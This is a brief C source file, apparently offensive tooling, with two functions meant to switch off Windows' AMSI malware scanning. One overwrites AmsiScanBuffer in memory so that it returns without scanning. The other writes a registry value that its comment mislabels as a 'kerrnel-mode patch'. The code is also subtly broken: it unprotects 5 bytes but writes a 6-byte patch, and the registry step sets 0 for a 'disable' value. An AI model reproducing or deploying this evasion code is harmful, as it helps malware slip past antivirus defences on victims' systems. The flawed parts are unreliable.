#include <Windows.h>
#include <amsi.h>

typedef HRESULT(WINAPI* AmsiScanBuffer_t)(
    HAMSICONTEXT amsiContext,
    PVOID        buffer,
    ULONG        length,
    LPCWSTR      contentName,
    HAMSISESSION amsiSession,
    AMSI_RESULT* result
    );

void PatchAMSI() {
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) return;

    AmsiScanBuffer_t pfnAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pfnAmsiScanBuffer) return;

    DWORD oldProtect;
    if (VirtualProtect(pfnAmsiScanBuffer, 5, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        BYTE patch[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xC3 }; // mov eax, 0; ret
        memcpy(pfnAmsiScanBuffer, patch, sizeof(patch));
        VirtualProtect(pfnAmsiScanBuffer, 5, oldProtect, &oldProtect);
    }
}

void DisableAMSI() {
    // kerrnel-mode patch (requires admin)
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\AMSI", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        DWORD value = 0;
        RegSetValueExW(hKey, L"DisableAMSI", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
        RegCloseKey(hKey);
    }
}
